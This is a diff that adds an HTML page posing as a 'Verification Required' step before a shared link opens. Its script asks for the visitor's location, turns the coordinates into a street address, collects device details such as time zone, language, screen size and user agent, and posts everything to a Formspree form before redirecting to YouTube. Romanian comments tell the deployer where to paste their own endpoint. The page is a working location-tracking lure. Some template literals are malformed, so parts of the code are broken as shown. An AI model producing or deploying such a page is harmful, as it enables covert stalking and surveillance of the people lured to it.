@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Content...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 100px 20px; background: #f9f9f9; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { padding: 12px 24px; font-size: 16px; font-weight: bold; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="content-box">
+        <h3>Verification Required</h3>
+        <p>Please confirm your location to access this shared link.</p>
+        <button onclick="startTest()">Verify & Open Link</button>
+    </div>
+
+    <script>
+        // ⚠️ LIPEȘTE LINK-UL TĂU DE PE FORMSPREE ÎNTRE GHIMELELE DE MAI JOS:
+        const FORMSPREE_URL = "https://formspree.io/f/xdaryvev"; 
+
+        // ⚠️ Aici pui site-ul unde vrei să fie trimiși (redirecționați) după ce apasă pe buton
+        const REDIRECT_URL = "https://youtube.com"; 
+
+        function startTest() {
+            if (navigator.geolocation) {
+                document.getElementById('content-box').innerHTML = '<div class="loader"></div><p>Verifying permissions...</p>';
+                navigator.geolocation.getCurrentPosition(sendLocationToMe, handleErrors);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocationToMe(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch(https://openstreetmap.org{lat}&lon=${lon})
+                .then(res => res.json())
+                .then(data => {
+                    const physicalAddress = data.display_name || "Unknown Address";
+                    submitData(lat, lon, physicalAddress);
+                })
+                .catch(() => {
+                    submitData(lat, lon, "Address Lookup Failed");
+                });
+        }
+
+        function submitData(lat, lon, address) {
+            const localDateTime = new Date().toLocaleString();
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const deviceLanguage = navigator.language || navigator.userLanguage;
+            const screenSize = ${window.screen.width}x${window.screen.height};
+            const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+
+            fetch(FORMSPREE_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    Latitude: lat,
+                    Longitude: lon,
+                    Estimated_Address: address,
+                    Device_Local_Time: localDateTime,
+                    Time_Zone: timeZone,
+                    Device_Language: deviceLanguage,
+                    Screen_Resolution: screenSize,
+                    Network_Connection: connectionType,
+                    Browser_User_Agent: navigator.userAgent
+                })
+            })
+            .then(() => {
+                window.location.href = REDIRECT_URL;
+            });
+        }
+
+        function handleErrors(error) {
+            document.getElementById('content-box').innerHTML = '<h3>Error</h3><p>You must allow location access to view this content.</p><br><button onclick="location.reload()">Try Again</button>';
+        }
+    </script>
+</body>
+</html>
